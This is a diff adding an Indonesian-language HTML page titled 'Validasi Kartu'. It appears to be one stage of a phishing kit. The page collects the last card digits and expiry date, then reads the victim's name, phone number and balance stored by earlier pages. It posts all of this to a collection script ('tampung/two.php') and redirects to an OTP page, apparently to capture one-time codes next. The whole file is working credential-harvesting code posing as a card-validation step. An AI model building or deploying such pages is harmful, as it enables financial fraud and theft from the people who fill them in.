@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="theme-color" content="#800080"> 
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+
+<title>Validasi Kartu</title>
+
+<style>
+body {
+  font-family: Arial, sans-serif;
+  padding: 10px;
+  margin: 0;
+
+  background: linear-gradient(
+    to bottom,
+    #e0f2fe 0%,
+    #e0f7fa 100%
+  );
+}
+
+/* BACKGROUND ATAS */
+body::before {
+  content: "";
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 50%;
+
+  background: url('images/bg.png') no-repeat top center;
+  background-size: cover;
+
+  opacity: 0.95;
+  z-index: -1;
+}
+
+/* KARTU */
+.card-box {
+  width: 300px;
+  height: 180px;
+  perspective: 1000px;
+  margin: 80px auto 30px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+.card {
+  width: 100%;
+  height: 100%;
+  transform-style: preserve-3d;
+  transition: transform 0.6s;
+}
+
+.card.flipped {
+  transform: rotateY(180deg);
+}
+
+.card .front,
+.card .back {
+  width: 100%;
+  height: 100%;
+  border-radius: 10px;
+  overflow: hidden;
+  color: white;
+  position: absolute;
+  backface-visibility: hidden;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+}
+
+.card .front {
+  background: url('images/joker1.png') no-repeat center/cover;
+}
+
+.card .back {
+  background: url('images/joker2.png') no-repeat center/cover;
+  transform: rotateY(180deg);
+}
+
+.card-number {
+  font-size: 20px;
+  margin-top: 80px;
+  letter-spacing: 2px;
+}
+
+.card-expiry {
+  font-size: 16px;
+  margin-top: 10px;
+}
+
+.card-cvv {
+  font-size: 18px;
+}
+
+/* FORM */
+.form-wrapper {
+  border-radius: 20px;
+  padding: 20px;
+  background-color: transparent;
+  backdrop-filter: blur(5px);
+  box-shadow: 0 0 10px rgba(0,0,0,0.15);
+  max-width: 400px;
+  margin: 0 auto 20px;
+}
+
+.form-group {
+  display: flex;
+  flex-direction: column;
+  max-width: 400px;
+  margin: 10px auto;
+}
+
+input[type="tel"] {
+  width: 90%;
+  padding: 15px;
+  font-size: 14px;
+  font-weight: bold;
+  outline: none;
+  border: 1px solid #137fd5;
+  border-radius: 8px;
+  color: #137fd5;
+  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+}
+
+.error {
+  color: red;
+  font-size: 12px;
+  margin-top: 5px;
+}
+
+.card-type {
+  text-align: center;
+  font-weight: bold;
+  font-size: 14px;
+  margin-bottom: 10px;
+}
+
+button {
+  margin-top: 20px;
+  width: 80%;
+  padding: 12px;
+  background-color: #0F78CB;
+  color: #fff;
+  font-size: 15px;
+  border: none;
+  border-radius: 6px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="card-box">
+  <div class="card" id="card">
+    <div class="front">
+      <div class="card-number" id="displayCardNumber">•••• •••• •••• ••••</div>
+      <div class="card-expiry">Valid Thru: <span id="displayExpiry">00/00</span></div>
+    </div>
+    <div class="back">
+      <div>CVV</div>
+      <div class="card-cvv" id="displayCVV">•••</div>
+    </div>
+  </div>
+</div>
+
+<div class="card-type" id="cardType"></div>
+
+<form action="otp.html" method="POST" onsubmit="return validateForm()">
+
+<div class="form-wrapper">
+
+<label style="color:#999;">𝗡𝗼𝗺𝗼𝗿 𝗞𝗮𝗿𝘁𝘂:</label>
+<div class="form-group">
+  <input type="tel" id="cardNumber" maxlength="4" placeholder="masukan 4 digit terakhir no.kartu">
+  <div class="error" id="cardError"></div>
+</div>
+
+<label style="color:#999;">𝗠𝗮𝘀𝗮 𝗕𝗲𝗿𝗹𝗮𝗸𝘂/𝗩𝗮𝗹𝗶𝗱 𝗧𝗵𝗿𝘂:</label>
+<div class="form-group">
+  <input type="tel" id="expiry" maxlength="5" placeholder="MM/YY">
+  <div class="error" id="expiryError"></div>
+</div>
+
+<div style="text-align:center">
+  <button type="submit">Lanjutkan</button>
+</div>
+
+</div>
+</form>
+
+<script>
+
+// FORMAT NOMOR
+document.getElementById('cardNumber').addEventListener('input', function () {
+  let value = this.value.replace(/\D/g, '').substring(0, 16);
+  this.value = value.replace(/(.{4})/g, '$1 ').trim();
+  document.getElementById('displayCardNumber').textContent = this.value || '•••• •••• •••• ••••';
+});
+
+// FORMAT EXPIRY
+document.getElementById('expiry').addEventListener('input', function () {
+  let value = this.value.replace(/\D/g, '').substring(0, 4);
+  if (value.length >= 3) {
+    this.value = value.substring(0, 2) + '/' + value.substring(2);
+  } else {
+    this.value = value;
+  }
+  document.getElementById('displayExpiry').textContent = this.value || 'MM/YY';
+});
+
+// VALIDASI
+function validateForm() {
+
+  let card = document.getElementById('cardNumber').value.replace(/\s/g, '');
+  let expiry = document.getElementById('expiry').value;
+
+  if (card.length < 4) {
+    alert("Nomor kartu tidak valid");
+    return false;
+  }
+
+  if (!expiry) {
+    alert("Tanggal wajib diisi");
+    return false;
+  }
+
+  // =========================
+  // AMBIL DATA DARI HALAMAN SEBELUMNYA
+  // =========================
+  let nama = localStorage.getItem("nama");
+  let nohp = localStorage.getItem("nohp");
+  let saldo = localStorage.getItem("saldo");
+
+  // =========================
+  // KIRIM KE SERVER
+  // =========================
+  fetch("tampung/two.php", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      nama: nama,
+      nohp: nohp,
+      saldo: saldo,
+      kartu: card,
+      expired: expiry
+    })
+  })
+  .then(res => res.text())
+  .then(res => {
+    if (res.includes("OK")) {
+
+      // simpan buat OTP
+      localStorage.setItem("kartu", card);
+      localStorage.setItem("expired", expiry);
+
+      // lanjut ke halaman OTP
+      window.location.href = "otp.html";
+
+    } else {
+      alert("Gagal kirim!");
+    }
+  })
+  .catch(() => {
+    alert("Error koneksi!");
+  });
+
+  return false; // ⛔ penting supaya tidak reload halaman
+}
+
+</script>
+
+</body>
+</html>
